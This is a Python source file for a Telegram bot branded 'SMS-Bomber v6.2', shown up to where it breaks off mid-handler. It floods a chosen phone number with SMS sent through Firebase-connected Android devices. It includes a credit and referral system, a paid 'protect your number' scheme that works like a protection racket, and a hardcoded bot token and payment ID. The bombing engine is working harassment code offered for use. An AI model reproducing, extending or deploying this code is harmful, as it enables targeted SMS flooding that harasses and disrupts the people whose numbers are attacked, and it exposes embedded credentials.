"""
✨ SMS-Bomber v6.2 — Styled Inline Edition ✨
────────────────────────────────────────────────────────────
• Styled inline buttons (API 9.4+) with premium-emoji icons
• Admin panel fully inline with Dashboard/Support/Docs shortcuts
• DB Backup + DB Restore buttons
• No max SMS limit — bomb as much as credits allow
• Premium emojis everywhere (<tg-emoji> in text, icon_custom_emoji_id in buttons)
"""
import asyncio, json, os, re, time, logging, random
from datetime import datetime, timedelta
from typing import Dict, List, Optional
from urllib.parse import quote
import aiohttp
from aiogram import Bot, Dispatcher, F, Router, types
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import (
    FSInputFile, ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove,
    InlineKeyboardMarkup, InlineKeyboardButton,
)

# ════════════════════════════════════════════════════════════════
# LOGGING
# ════════════════════════════════════════════════════════════════
logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(name)s — %(message)s")
log = logging.getLogger("SMSBomber")

# ════════════════════════════════════════════════════════════════
# CONFIG
# ════════════════════════════════════════════════════════════════
BOT_TOKEN = "8231418860:AAG3XVwTZ6ZeuKUdKuFxVtin2rjiUvf3wsI"
OWNER_ID  = 8679787798
DATA_FILE = "bomber_data.json"
VERSION   = "v6.2"

FORCE_JOIN_CHANNELS = ["@tchbsterarmy", "@errorarmy"]

PROTECTION_PRICE = 10
PAYMENT_UPI      = "8707210511@fam"

WELCOME_BONUS  = 599
REFER_BONUS    = 999
CREDIT_PER_SMS = 1

SUPPORT_URL    = "https://t.me/ryxastro"
CHANNEL_URL    = "https://t.me/errorarmy1/"
DOCS_URL       = "https://t.me/xxyyyms/"

SEP = "____________"

# ════════════════════════════════════════════════════════════════
# PREMIUM EMOJI CATALOG
# ════════════════════════════════════════════════════════════════
PREMIUM_EMOJI = {
    # core
    "bomb":        ("💣", "5368324170671202286"),
    "explosion":   ("💥", "5276032951342088188"),
    "fire":        ("🔥", "5424972470023104089"),
    "rocket":      ("🚀", "5424983750296564249"),
    "sparkles":    ("✨", "5323442290708985472"),
    "star":        ("⭐", "5438496463044752972"),
    # money
    "money":       ("💰", "5409048419211682843"),
    "gift":        ("🎁", "5424983750296564249"),
    "credit_card": ("💳", "5409048419211682843"),
    "wallet":      ("👛", "5769403330761593044"),
    # security
    "shield":      ("🛡️", "5210952531676504517"),
    "lock":        ("🔒", "5424972470023104089"),
    "check":       ("✅", "5206607081334906820"),
    "cross":       ("❌", "5210952531676504517"),
    # alerts
    "warning":     ("⚠️", "5447644880824181073"),
    "bell":        ("🔔", "5458603043203327669"),
    "info":        ("ℹ️", "5323442290708985472"),
    # users
    "user":        ("👤", "5368324170671202286"),
    "people":      ("👥", "5942877472163892475"),
    "crown":       ("👑", "5368324170671202286"),
    "ban":         ("🚫", "5260293700088511294"),
    # stats
    "stats":       ("📊", "5231200819986047254"),
    "chart_up":    ("📈", "5449683594425410231"),
    "chart_down":  ("📉", "5447183459602669338"),
    # ui
    "back":        ("◀️", "5875082500023258804"),
    "link":        ("🔗", "5460795800101594035"),
    "pin":         ("📌", "5397782960512444700"),
    "phone":       ("📞", "5368324170671202286"),
    "msg":         ("💬", "5467538555158943525"),
    "numbers":     ("🔢", "5368324170671202286"),
    "timer":       ("⏱", "5424983750296564249"),
    "broadcast":   ("📢", "5424818078833715060"),
    "save":        ("💾", "5409048419211682843"),
    "download":    ("📥", "5875082500023258804"),
    "up":          ("⬆️", "5449683594425410231"),
    "docs":        ("📚", "5222444124698853912"),
    "dashboard":   ("🖥", "5368324170671202286"),
    "support":     ("💬", "5467538555158943525"),
    "tools":       ("🛠️", "5341715473882955310"),
}

class PE:
    @staticmethod
    def emoji(name: str) -> str:
        pair = PREMIUM_EMOJI.get(name)
        if not pair: return ""
        fallback, eid = pair
        return f'<tg-emoji emoji-id="{eid}">{fallback}</tg-emoji>'

    @staticmethod
    def _id(name): return PREMIUM_EMOJI.get(name, ("", None))[1]

    def __getattr__(self, name):
        # Allow PE.bomb(), PE.money() etc.
        if name in PREMIUM_EMOJI:
            return lambda: PE.emoji(name)
        raise AttributeError(name)

PE = PE()

# ════════════════════════════════════════════════════════════════
# SMALL-CAPS HELPERS
# ════════════════════════════════════════════════════════════════
SC_MAP = {
    'a':'ᴀ','b':'ʙ','c':'ᴄ','d':'ᴅ','e':'ᴇ','f':'ꜰ','g':'ɢ','h':'ʜ','i':'ɪ',
    'j':'ᴊ','k':'ᴋ','l':'ʟ','m':'ᴍ','n':'ɴ','o':'ᴏ','p':'ᴘ','q':'ǫ','r':'ʀ',
    's':'ꜱ','t':'ᴛ','u':'ᴜ','v':'ᴠ','w':'ᴡ','x':'x','y':'ʏ','z':'ᴢ'
}

def sc(text: str) -> str:
    if not isinstance(text, str): return str(text)
    # Keep tg-emoji tags intact
    parts = re.split(r'(<tg-emoji[^>]*>.*?</tg-emoji>|<[^>]+>)', text)
    for i in range(0, len(parts), 2):
        parts[i] = "".join(SC_MAP.get(c.lower(), c) for c in parts[i])
    return "".join(parts)

# ════════════════════════════════════════════════════════════════
# STYLED INLINE BUTTON HELPER
# ════════════════════════════════════════════════════════════════
try:
    types.InlineKeyboardButton(text="t", callback_data="t", style="primary")
    STYLE_SUPPORTED = True
    log.info("✅ Styled inline buttons supported (Bot API 9.4+)")
except Exception:
    STYLE_SUPPORTED = False
    log.warning("⚠️ Styled inline buttons NOT supported — will fall back")

def _ibtn(text: str, callback_data: str = None, url: str = None,
          style: str = "primary", icon: str = None) -> types.InlineKeyboardButton:
    """Create a styled inline button with optional premium-emoji icon."""
    kwargs = {"text": text}
    if callback_data is not None: kwargs["callback_data"] = callback_data
    if url is not None: kwargs["url"] = url
    if style and STYLE_SUPPORTED: kwargs["style"] = style
    if icon and icon in PREMIUM_EMOJI:
        kwargs["icon_custom_emoji_id"] = PREMIUM_EMOJI[icon][1]
    try:
        return types.InlineKeyboardButton(**kwargs)
    except Exception:
        # graceful fallback
        kwargs.pop("style", None)
        kwargs.pop("icon_custom_emoji_id", None)
        try:
            return types.InlineKeyboardButton(**kwargs)
        except Exception:
            return types.InlineKeyboardButton(text=str(text)[:60], callback_data="noop")

def kbi(rows: list) -> types.InlineKeyboardMarkup:
    """Build InlineKeyboardMarkup.
    Row item spec: (text, callback_or_url, style, icon_name)
    Or dict with keys: text, callback_data / url, style, icon
    """
    kb_rows = []
    for row in rows:
        r = []
        for item in row:
            try:
                if isinstance(item, dict):
                    r.append(_ibtn(**item))
                elif isinstance(item, tuple):
                    text = item[0]
                    cb = item[1] if len(item) > 1 else None
                    style = item[2] if len(item) > 2 else "primary"
                    icon = item[3] if len(item) > 3 else None
                    if cb and isinstance(cb, str) and cb.startswith("http"):
                        r.append(_ibtn(text, url=cb, style=style, icon=icon))
                    else:
                        r.append(_ibtn(text, callback_data=cb, style=style, icon=icon))
            except Exception as e:
                log.warning(f"kbi error: {e}")
        if r: kb_rows.append(r)
    return types.InlineKeyboardMarkup(inline_keyboard=kb_rows)

# ════════════════════════════════════════════════════════════════
# FSM STATES
# ════════════════════════════════════════════════════════════════
class Form(StatesGroup):
    bomb_number    = State()
    bomb_message   = State()
    bomb_count     = State()
    bomb_confirm   = State()
    protect_txn    = State()
    protect_number = State()
    fb_add_url     = State()
    fb_add_api     = State()
    broadcast_msg  = State()
    db_restore     = State()
    admin_add_id   = State()
    ban_id         = State()

# ════════════════════════════════════════════════════════════════
# STORAGE
# ════════════════════════════════════════════════════════════════
def default_user():
    return {
        "username": "", "first_name": "", "credits": 0,
        "join_date": datetime.now().isoformat(),
        "referred_by": None, "referral_rewarded": False,
        "total_sent": 0, "total_bombs": 0,
    }

def default_data():
    return {
        "admins": [OWNER_ID], "firebases": [], "banned": [],
        "schedules": [], "protected_numbers": [], "protection_requests": [],
        "users": {},
        "stats": {"total_sent": 0, "total_failed": 0, "total_bombings": 0},
    }

def load():
    try:
        if os.path.exists(DATA_FILE):
            with open(DATA_FILE, "r") as f:
                d = json.load(f)
            base = default_data()
            for k, v in base.items():
                if k not in d: d[k] = v
            return d
    except Exception as e:
        log.error(f"load() error: {e}")
    return default_data()

def save(d):
    try:
        with open(DATA_FILE, "w") as f:
            json.dump(d, f, indent=2)
    except Exception as e:
        log.error(f"save() error: {e}")

def is_admin(uid, d): return uid in d.get("admins", []) or uid == OWNER_ID
def is_banned(uid, d): return uid in d.get("banned", [])

def get_user(d, uid):
    users = d.setdefault("users", {})
    key = str(uid)
    if key not in users:
        users[key] = default_user()
    return users[key]

def ensure_user(d, tg_user):
    u = get_user(d, tg_user.id)
    u["username"]   = tg_user.username or ""
    u["first_name"] = tg_user.first_name or ""
    return u

# ════════════════════════════════════════════════════════════════
# REPLY KEYBOARDS (main navigation only)
# ════════════════════════════════════════════════════════════════
def kb_main(is_admin_user=False):
    rows = [
        [KeyboardButton(text="💣 Start Bomb")],
        [KeyboardButton(text="🎁 Refer & Earn"), KeyboardButton(text="📖 How to Use")],
        [KeyboardButton(text="🛡️ Protect Number"), KeyboardButton(text="📢 Join Updates")],
    ]
    if is_admin_user:
        rows.append([KeyboardButton(text="🛠️ Admin Panel")])
    return ReplyKeyboardMarkup(keyboard=rows, resize_keyboard=True)

def kb_cancel():
    return ReplyKeyboardMarkup(keyboard=[[KeyboardButton(text="❌ Cancel")]], resize_keyboard=True)

def kb_confirm():
    return ReplyKeyboardMarkup(
        keyboard=[[KeyboardButton(text="✅ Confirm"), KeyboardButton(text="❌ Cancel")]],
        resize_keyboard=True)

def kb_verify():
    return ReplyKeyboardMarkup(
        keyboard=[[KeyboardButton(text="✅ Verify Joined")]],
        resize_keyboard=True, one_time_keyboard=True)

def kb_pay():
    return ReplyKeyboardMarkup(
        keyboard=[[KeyboardButton(text="💳 Pay")], [KeyboardButton(text="❌ Cancel")]],
        resize_keyboard=True)

def kb_paid():
    return ReplyKeyboardMarkup(
        keyboard=[[KeyboardButton(text="✅ I have paid")], [KeyboardButton(text="◀️ Back")]],
        resize_keyboard=True)

# ════════════════════════════════════════════════════════════════
# INLINE KEYBOARDS (admin panel + actions)
# ════════════════════════════════════════════════════════════════
def admin_panel_inline(d):
    pending = len([r for r in d.get("protection_requests", []) if r.get("status") == "pending"])
    return kbi([
        [("📊 Stats",        "admin:stats",       "primary", "stats"),
         ("📈 Live Status",  "admin:status",      "primary", "chart_up")],
        [("📢 Broadcast",    "admin:broadcast",   "success", "broadcast"),
         (f"🛡️ Protections ({pending})", "admin:protection", "primary", "shield")],
        [("💣 Firebase Mgmt","admin:fb",          "success", "bomb"),
         ("⏰ Schedules",    "admin:schedules",   "primary", "timer")],
        [("👥 Admins",       "admin:admins",      "primary", "people"),
         ("🚫 Ban/Unban",    "admin:ban",         "danger",  "ban")],
        [("💾 DB Backup",    "admin:db_backup",   "success", "save"),
         ("📥 DB Restore",   "admin:db_restore",  "danger",  "download")],
        [("🖥 Dashboard",    CHANNEL_URL,         "primary", "dashboard")],
        [("💬 Support",      SUPPORT_URL,         "danger",  "support"),
         ("📚 Docs",         DOCS_URL,            "success", "docs")],
        [("◀️ Back to Menu", "home",              "danger",  "back")],
    ])

def fb_list_inline(fbs):
    rows = []
    for i, fb in enumerate(fbs, 1):
        rows.append([(f"🗑 Remove #{i}", f"admin:fb_del:{fb['id']}", "danger", "cross")])
    rows.append([("➕ Add Firebase", "admin:fb_add", "success", "up")])
    rows.append([("◀️ Back", "admin:panel", "primary", "back")])
    return kbi(rows)

def admins_inline(d):
    admins = d.get("admins", [OWNER_ID])
    rows = []
    for a in admins:
        if a == OWNER_ID: continue
        rows.append([(f"🗑 Remove {a}", f"admin:admin_del:{a}", "danger", "cross")])
    rows.append([("➕ Add Admin", "admin:admin_add", "success", "up")])
    rows.append([("◀️ Back", "admin:panel", "primary", "back")])
    return kbi(rows)

def protections_inline(pending):
    rows = []
    for r in pending:
        rows.append([
            (f"✅ Approve {r['number']}", f"admin:prot_approve:{r['id']}", "success", "check"),
            (f"❌ Reject",               f"admin:prot_reject:{r['id']}",  "danger",  "cross"),
        ])
    rows.append([("◀️ Back", "admin:panel", "primary", "back")])
    return kbi(rows)

def unban_inline(banned):
    rows = []
    for uid in banned:
        rows.append([(f"✅ Unban {uid}", f"admin:unban_do:{uid}", "success", "check")])
    rows.append([("◀️ Back", "admin:panel", "primary", "back")])
    return kbi(rows)

def back_admin_inline():
    return kbi([[("◀️ Back", "admin:panel", "primary", "back")]])

# ════════════════════════════════════════════════════════════════
# FORCE JOIN
# ════════════════════════════════════════════════════════════════
async def check_fj(bot: Bot, user_id: int, channels: list) -> bool:
    if not channels: return True
    for ch in channels:
        try:
            m = await bot.get_chat_member(ch, user_id)
            if m.status in ("left", "kicked", None): return False
        except Exception:
            return False
    return True

async def send_fj_ui(msg: types.Message, channels: list):
    text = (
        f"{PE.sparkles()} <b>{sc('JOIN REQUIRED')}</b> {PE.sparkles()}\n"
        f"{SEP}\n"
        f"{sc('You must join the following channels to use this bot:')}\n"
        f"{SEP}"
    )
    for ch in channels:
        clean = ch.replace("@", "")
        text += f"\n{PE.bell()} <a href='https://t.me/{clean}'>{ch}</a>"
    text += (
        f"\n{SEP}\n"
        f"{sc('After joining, tap the')} {PE.check()} <b>{sc('Verify Joined')}</b> {sc('button below.')}\n"
        f"{SEP}"
    )
    await msg.answer(text, reply_markup=kb_verify(), parse_mode="HTML",
                     disable_web_page_preview=True)

# ════════════════════════════════════════════════════════════════
# FIREBASE HELPERS
# ════════════════════════════════════════════════════════════════
async def fb_get(base, path, api_key=""):
    url = base.rstrip("/") + path
    if api_key: url += f"?auth={api_key}"
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get(url, timeout=15) as r:
                if r.status == 200:
                    txt = await r.text()
                    return {} if txt in ("null", "") else json.loads(txt)
    except Exception as e:
        log.error(f"fb_get error: {e}")
    return {}

async def fb_put(base, path, payload, api_key=""):
    url = base.rstrip("/") + path
    if api_key: url += f"?auth={api_key}"
    for attempt in range(3):
        try:
            async with aiohttp.ClientSession() as s:
                async with s.put(url, json=payload, timeout=15) as r:
                    if 200 <= r.status < 300: return True
        except Exception as e:
            log.warning(f"fb_put error: {e}")
        await asyncio.sleep(0.4 * (attempt + 1))
    return False

def is_device_online(device_data: dict) -> bool:
    for flag in ("isOnline", "online", "connected", "status"):
        if flag in device_data and device_data[flag] in (True, 1, "online", "active", "true"):
            return True
    return False

async def discover_online_devices(fb):
    data = await fb_get(fb["url"], "/clients.json", fb.get("api_key", ""))
    if not data or not isinstance(data, dict): return []
    out = []
    for dev_id, dev in data.items():
        if not is_device_online(dev): continue
        sims = dev.get("sims") or [{"simSlotIndex": 0, "phoneNumber": dev.get("phoneNumber", "")}]
        for sim in sims:
            out.append({
                "fb_id": fb["id"], "fb_url": fb["url"], "api_key": fb.get("api_key", ""),
                "device_id": dev_id, "device_name": dev.get("deviceName", dev_id),
                "sim_slot": sim.get("simSlotIndex", 0),
                "phone_number": sim.get("phoneNumber", ""),
                "battery": dev.get("battery", 0),
            })
    return out

async def discover_all_devices(firebases):
    tasks = [discover_online_devices(fb) for fb in firebases]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    out = []
    for r in results:
        if isinstance(r, list): out.extend(r)
    return out

async def send_single_sms(device, to, message):
    payload = {
        "from": device["sim_slot"], "to": to.strip(), "message": message.strip(),
        "isSended": False, "timestamp": int(time.time()),
        "deviceId": device["device_id"], "simSlot": device["sim_slot"],
    }
    path = f"/clients/{device['device_id']}/webhookEvent/sendSms.json"
    ok = await fb_put(device["fb_url"], path, payload, device.get("api_key", ""))
    return ok, device["device_name"], device["device_id"]

# ════════════════════════════════════════════════════════════════
# ANIMATION
# ════════════════════════════════════════════════════════════════
SPINNER = ["⠋","⠙","⠹","⠸","⠼","⠴","⠦","⠧","⠇","⠏"]
RADAR   = ["📡","🛰️","📶","🔭","📡"]

async def animate_edit(msg, text, duration=2, frames=None):
    if frames is None: frames = SPINNER
    fps = 5
    for i in range(max(1, duration * fps)):
        try:
            await msg.edit_text(f"<code>{frames[i % len(frames)]}</code> {text}", parse_mode="HTML")
        except Exception: pass
        await asyncio.sleep(1.0 / fps)

async def animate_radar(msg, text, d=2): await animate_edit(msg, text, d, RADAR)

# ════════════════════════════════════════════════════════════════
# BOMBING ENGINE
# ════════════════════════════════════════════════════════════════
_bombing_tasks  = {}
_bombing_status = {}

def refund_credits(user_id, amount):
    if amount <= 0: return
    d = load()
    u = get_user(d, user_id)
    u["credits"] = u.get("credits", 0) + amount
    save(d)

async def bomber_worker(bot, user_id, number, message, count, schedule_id=None):
    d = load()
    firebases = d.get("firebases", [])
    if not firebases:
        refund_credits(user_id, count * CREDIT_PER_SMS)
        try:
            await bot.send_message(user_id,
                f"{PE.cross()} {sc('No firebase configured. Credits refunded.')}",
                parse_mode="HTML")
        except Exception: pass
        return

    status_msg = await bot.send_message(user_id,
        f"{PE.rocket()} {sc('Discovering devices...')}", parse_mode="HTML")
    await animate_radar(status_msg, sc("Scanning devices..."), 2)

    all_devices = await discover_all_devices(firebases)
    if not all_devices:
        refund_credits(user_id, count * CREDIT_PER_SMS)
        try:
            await status_msg.edit_text(
                f"{PE.cross()} {sc('No online devices. Credits refunded.')}",
                parse_mode="HTML")
        except Exception: pass
        return

    try:
        await status_msg.edit_text(
            f"{PE.bomb()} <b>{sc('Bombing Started')}</b>\n{SEP}\n"
            f"{PE.phone()} {sc('Target')}: <code>{number}</code>\n"
            f"{PE.numbers()} {sc('Count')}: <b>{count}</b>\n"
            f"{PE.people()} {sc('Devices')}: <b>{len(all_devices)}</b>\n{SEP}",
            parse_mode="HTML")
    except Exception: pass

    sent, failed, attempts = 0, 0, 0
    max_attempts = count * 3
    device_index = 0
    start_time = time.time()
    _bombing_status[user_id] = {
        "total": count, "sent": 0, "failed": 0,
        "devices": len(all_devices), "start": start_time,
        "running": True, "number": number,
    }

    last_shown = -1
    while sent < count and attempts < max_attempts:
        if user_id in _bombing_tasks and _bombing_tasks[user_id].cancelled():
            break
        dev = all_devices[device_index % len(all_devices)]
        device_index += 1; attempts += 1
        try:
            ok, _, _ = await send_single_sms(dev, number, message)
        except Exception as e:
            log.warning(f"send error: {e}"); ok = False
        if ok: sent += 1
        else: failed += 1

        _bombing_status[user_id]["sent"]   = sent
        _bombing_status[user_id]["failed"] = failed

        progress = int(sent / count * 100)
        if progress // 10 != last_shown // 10 or sent >= count:
            last_shown = progress
            bar_len = 15
            filled = int(bar_len * sent / count)
            bar = "█" * filled + "░" * (bar_len - filled)
            try:
                await status_msg.edit_text(
                    f"{PE.bomb()} <b>{sc('Bombing')}</b>\n{SEP}\n"
                    f"{PE.phone()} <code>{number}</code>\n"
                    f"{PE.check()} {sc('Sent')}: <b>{sent}</b> / {count}\n"
                    f"{PE.cross()} {sc('Failed')}: <b>{failed}</b>\n"
                    f"{PE.stats()} <code>{bar}</code> {progress}%\n"
                    f"{PE.timer()} {int(time.time() - start_time)}s\n{SEP}",
                    parse_mode="HTML")
            except Exception: pass

        await asyncio.sleep(0.05)

    if sent < count:
        refund_credits(user_id, (count - sent) * CREDIT_PER_SMS)

    _bombing_status[user_id]["running"] = False

    d = load()
    d["stats"]["total_sent"]     += sent
    d["stats"]["total_failed"]   += failed
    d["stats"]["total_bombings"] += 1
    u = get_user(d, user_id)
    u["total_sent"]  = u.get("total_sent", 0) + sent
    u["total_bombs"] = u.get("total_bombs", 0) + 1
    save(d)

    final = (
        f"{PE.explosion()} <b>{sc('Bombing Complete')}</b>\n{SEP}\n"
        f"{PE.phone()} <code>{number}</code>\n"
        f"{PE.check()} {sc('Sent')}: <b>{sent}</b>\n"
        f"{PE.cross()} {sc('Failed')}: <b>{failed}</b>\n"
        f"{PE.timer()} {sc('Duration')}: {int(time.time() - start_time)}s\n"
        f"{PE.credit_card()} {sc('Credits used')}: <b>{sent * CREDIT_PER_SMS}</b>\n{SEP}"
    )
    try:
        await bot.send_message(user_id, final, parse_mode="HTML")
    except Exception:
        try: await bot.send_message(user_id, f"✅ Sent: {sent} / ❌ Failed: {failed}")
        except Exception: pass

    if user_id in _bombing_tasks:
        del _bombing_tasks[user_id]

async def start_bombing(bot, user_id, number, message, count, schedule_id=None):
    if user_id in _bombing_tasks:
        try: _bombing_tasks[user_id].cancel()
        except Exception: pass
        await asyncio.sleep(0.5)
    task = asyncio.create_task(bomber_worker(bot, user_id, number, message, count, schedule_id))
    _bombing_tasks[user_id] = task
    return task

def stop_bombing(user_id):
    if user_id in _bombing_tasks:
        try: _bombing_tasks[user_id].cancel()
        except Exception: pass
        del _bombing_tasks[user_id]
        return True
    return False

# ════════════════════════════════════════════════════════════════
# REFERRAL / DASHBOARD
# ════════════════════════════════════════════════════════════════
async def check_and_reward_referrer(bot, uid):
    d = load()
    users = d.get("users", {})
    u = users.get(str(uid))
    if not u: return
    ref = u.get("referred_by")
    if not ref or u.get("referral_rewarded"): return
    if int(ref) == int(uid): return
    referrer = users.get(str(ref))
    if not referrer: return
    referrer["credits"] = referrer.get("credits", 0) + REFER_BONUS
    u["referral_rewarded"] = True
    save(d)
    try:
        await bot.send_message(
            int(ref),
            f"{PE.gift()} <b>{sc('Referral Bonus!')}</b>\n{SEP}\n"
            f"{PE.user()} {sc('New user joined via your link')}\n"
            f"{PE.money()} +{REFER_BONUS} {sc('credits added')}\n{SEP}",
            parse_mode="HTML")
    except Exception: pass

async def send_dashboard(target, uid):
    d = load()
    u = get_user(d, uid)
    try:
        jd = datetime.fromisoformat(u.get("join_date", datetime.now().isoformat())).strftime("%d %b %Y")
    except Exception:
        jd = str(u.get("join_date", "N/A"))
    username = u.get("username") or "N/A"
    credits  = u.get("credits", 0)

    text = (
        f"{PE.bomb()} <b>{sc('SMS Bomber Dashboard')}</b>\n{SEP}\n"
        f"{PE.user()} {sc('Username')}: @{username}\n"
        f"🆔 {sc('User ID')}: <code>{uid}</code>\n"
        f"📅 {sc('Join Date')}: {jd}\n{SEP}\n"
        f"{PE.money()} {sc('Credits')}: <b>{credits}</b>\n{SEP}\n"
        f"{sc('Choose an option from the menu below.')}\n{SEP}"
    )
    if isinstance(target, types.CallbackQuery):
        try: await target.message.edit_reply_markup(reply_markup=None)
        except Exception: pass
        await target.message.answer(text, reply_markup=kb_main(is_admin(uid, d)), parse_mode="HTML")
    else:
        await target.answer(text, reply_markup=kb_main(is_admin(uid, d)), parse_mode="HTML")

# ════════════════════════════════════════════════════════════════
# ROUTER
# ════════════════════════════════════════════════════════════════
R = Router()

# ── /start ────────────────────────────────────────────────────
@R.message(Command("start"))
async def cmd_start(msg: types.Message, state: FSMContext):
    await state.clear()
    uid = msg.from_user.id
    d = load()

    if is_banned(uid, d):
        await msg.answer(f"{PE.ban()} {sc('You are banned from using this bot.')}", parse_mode="HTML")
        return

    ref_id = None
    parts = msg.text.split()
    if len(parts) > 1 and parts[1].startswith("ref_"):
        try: ref_id = int(parts[1][4:])
        except Exception: ref_id = None

    d = load()
    is_new = str(uid) not in d.get("users", {})
    u = ensure_user(d, msg.from_user)
    if is_new:
        u["credits"]   = WELCOME_BONUS
        u["join_date"] = datetime.now().isoformat()
        if ref_id and ref_id != uid and str(ref_id) in d.get("users", {}):
            u["referred_by"] = ref_id
        save(d)
        try:
            await msg.answer(
                f"{PE.gift()} <b>{sc('Welcome Bonus!')}</b>\n{SEP}\n"
                f"{PE.money()} +{WELCOME_BONUS} {sc('credits added to your account')}\n{SEP}",
                parse_mode="HTML")
        except Exception: pass
    else:
        save(d)

    if not await check_fj(msg.bot, uid, FORCE_JOIN_CHANNELS):
        await send_fj_ui(msg, FORCE_JOIN_CHANNELS); return

    await check_and_reward_referrer(msg.bot, uid)
    await send_dashboard(msg, uid)

# ── Verify Joined ─────────────────────────────────────────────
@R.message(F.text == "✅ Verify Joined")
async def handle_verify_joined(msg: types.Message, state: FSMContext):
    uid = msg.from_user.id
    if await check_fj(msg.bot, uid, FORCE_JOIN_CHANNELS):
        await check_and_reward_referrer(msg.bot, uid)
        await msg.answer(f"{PE.check()} {sc('Verified successfully!')}", parse_mode="HTML")
        await send_dashboard(msg, uid)
    else:
        await msg.answer(f"{PE.cross()} {sc('You have not joined all required channels yet.')}",
                         parse_mode="HTML")

# ── Cancel ────────────────────────────────────────────────────
@R.message(F.text == "❌ Cancel")
@R.message(Command("cancel"))
async def handle_cancel(msg: types.Message, state: FSMContext):
    await state.clear()
    d = load()
    await msg.answer(f"{PE.check()} {sc('Cancelled.')}",
                     reply_markup=kb_main(is_admin(msg.from_user.id, d)), parse_mode="HTML")

@R.message(Command("stop"))
async def cmd_stop(msg: types.Message):
    if stop_bombing(msg.from_user.id):
        await msg.answer(f"{PE.check()} {sc('Bombing stopped.')}", parse_mode="HTML")
    else:
        await msg.answer(f"{PE.info()} {sc('No active bombing to stop.')}", parse_mode="HTML")

# ── How to Use ────────────────────────────────────────────────
@R.message(F.text == "📖 How to Use")
async def handle_howto(msg: types.Message, state: FSMContext):
    await state.clear()
    d = load()
    text = (
        f"{PE.info()} <b>{sc('How to Use')}</b>\n{SEP}\n"
        f"1️⃣ {sc('Refer friends to earn credits, or contact admin')}\n"
        f"2️⃣ {sc('Tap')} {PE.bomb()} {sc('Start Bomb')}\n"
        f"3️⃣ {sc('Enter target number (e.g. +919876543210)')}\n"
        f"4️⃣ {sc('Enter the message text')}\n"
        f"5️⃣ {sc('Enter count — as many as your credits allow')}\n"
        f"6️⃣ {sc('Confirm and watch it go')}\n{SEP}\n"
        f"💡 <b>{sc('Earn credits')}:</b>\n"
        f"• {sc('Welcome bonus')}: <b>{WELCOME_BONUS}</b>\n"
        f"• {sc('Refer & Earn')}: <b>{REFER_BONUS}</b> {sc('per referral')}\n"
        f"• {sc('Protect Number')}: {PROTECTION_PRICE} Rs\n{SEP}"
    )
    await msg.answer(text, reply_markup=kb_main(is_admin(msg.from_user.id, d)), parse_mode="HTML")

# ── Join Updates ──────────────────────────────────────────────
@R.message(F.text == "📢 Join Updates")
async def handle_updates(msg: types.Message, state: FSMContext):
    await state.clear()
    d = load()
    text = f"{PE.bell()} <b>{sc('Join Updates')}</b>\n{SEP}"
    for ch in FORCE_JOIN_CHANNELS:
        text += f"\n{PE.link()} <a href='https://t.me/{ch.replace('@','')}'>{ch}</a>"
    text += f"\n{SEP}"
    await msg.answer(text, reply_markup=kb_main(is_admin(msg.from_user.id, d)),
                     parse_mode="HTML", disable_web_page_preview=True)

# ── Refer & Earn ──────────────────────────────────────────────
@R.message(F.text == "🎁 Refer & Earn")
async def handle_refer(msg: types.Message, state: FSMContext):
    await state.clear()
    uid = msg.from_user.id
    d = load()
    u = get_user(d, uid)
    me = await msg.bot.get_me()
    link = f"https://t.me/{me.username}?start=ref_{uid}"
    ref_count = sum(1 for x in d.get("users", {}).values() if x.get("referred_by") == uid)
    rewarded  = sum(1 for x in d.get("users", {}).values()
                    if x.get("referred_by") == uid and x.get("referral_rewarded"))
    text = (
        f"{PE.gift()} <b>{sc('Refer & Earn')}</b>\n{SEP}\n"
        f"{PE.money()} {sc('Earn')} <b>{REFER_BONUS} {sc('credits')}</b> {sc('per referral!')}\n{SEP}\n"
        f"{PE.link()} {sc('Your referral link')}:\n"
        f"<code>{link}</code>\n{SEP}\n"
        f"{PE.people()} {sc('Total referrals')}: <b>{ref_count}</b>\n"
        f"{PE.check()} {sc('Rewarded')}: <b>{rewarded}</b>\n"
        f"{PE.credit_card()} {sc('Your credits')}: <b>{u.get('credits', 0)}</b>\n{SEP}\n"
        f"{sc('Share with friends — they must join the channels to unlock your bonus.')}\n{SEP}"
    )
    await msg.answer(text, reply_markup=kb_main(is_admin(uid, d)),
                     parse_mode="HTML", disable_web_page_preview=True)

# ── Bomb flow ─────────────────────────────────────────────────
@R.message(F.text == "💣 Start Bomb")
async def handle_bomb_start(msg: types.Message, state: FSMContext):
    await state.clear()
    uid = msg.from_user.id
    d = load()

    if is_banned(uid, d):
        await msg.answer(f"{PE.ban()} {sc('You are banned.')}", parse_mode="HTML"); return
    if not await check_fj(msg.bot, uid, FORCE_JOIN_CHANNELS):
        await send_fj_ui(msg, FORCE_JOIN_CHANNELS); return

    u = get_user(d, uid)
    if u.get("credits", 0) < CREDIT_PER_SMS:
        await msg.answer(
            f"{PE.cross()} <b>{sc('Insufficient Credits')}</b>\n{SEP}\n"
            f"{PE.credit_card()} {sc('Balance')}: <b>{u.get('credits', 0)}</b>\n"
            f"{PE.gift()} {sc('Refer friends to earn')} {REFER_BONUS} {sc('credits each!')}\n{SEP}",
            reply_markup=kb_main(is_admin(uid, d)), parse_mode="HTML")
        return
    if not d.get("firebases"):
        await msg.answer(f"{PE.cross()} {sc('No firebase configured. Try again later.')}",
                         reply_markup=kb_main(is_admin(uid, d)), parse_mode="HTML")
        return

    await state.set_state(Form.bomb_number)
    await msg.answer(
        f"{PE.bomb()} <b>{sc('Start Bomb')}</b>\n{SEP}\n"
        f"{PE.phone()} {sc('Enter target number')}:\n"
        f"<code>+919876543210</code>\n{SEP}\n"
        f"<i>{sc('Tap Cancel to abort.')}</i>",
        reply_markup=kb_cancel(), parse_mode="HTML")

@R.message(Form.bomb_number)
async def bomb_get_number(msg: types.Message, state: FSMContext):
    if not msg.text: return
    number = msg.text.strip().replace(" ", "").replace("-", "")
    if not re.match(r'^\+?[0-9]{8,15}$', number):
        await msg.answer(f"{PE.cross()} {sc('Invalid number. Example: +919876543210')}",
                         parse_mode="HTML"); return
    d = load()
    if number in d.get("protected_numbers", []):
        await msg.answer(
            f"{PE.shield()} <b>{sc('Protected Number')}</b>\n{SEP}\n"
            f"{PE.ban()} {sc('This number is protected and cannot be bombed.')}\n{SEP}",
            reply_markup=kb_main(is_admin(msg.from_user.id, d)), parse_mode="HTML")
